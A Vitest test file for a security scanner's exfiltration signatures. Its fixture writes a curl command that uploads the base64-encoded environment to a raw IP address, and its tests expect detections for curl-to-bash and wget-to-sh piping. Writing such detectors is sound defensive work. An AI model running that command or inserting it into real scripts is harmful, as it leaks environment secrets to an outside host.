import { describe, it, expect } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import { scan } from "../scanner.js";

describe("Exfiltration signatures", () => {
  it("detects an encoded environment upload", async () => {
    fs.writeFileSync(
      path.join("/tmp/scg-fixture", "ci.sh"),
      'curl -X POST http://216.126.225.129:8443 -d "$(env | base64)"',
    );
    const report = await scan({ target: "/tmp/scg-fixture", format: "text" });
    const finding = report.findings.find((f) => f.rule === "ENV_EXFIL_CURL");
    expect(finding).toBeDefined();
  });

  it("detects a download piped to a shell", async () => {
    const report = await scan({ target: "/tmp/scg-fixture", format: "text" });
    expect(report.findings.some((f) => f.rule === "CURL_PIPE_BASH")).toBe(true);
    expect(report.findings.some((f) => f.rule === "WGET_PIPE_SH")).toBe(true);
  });
});
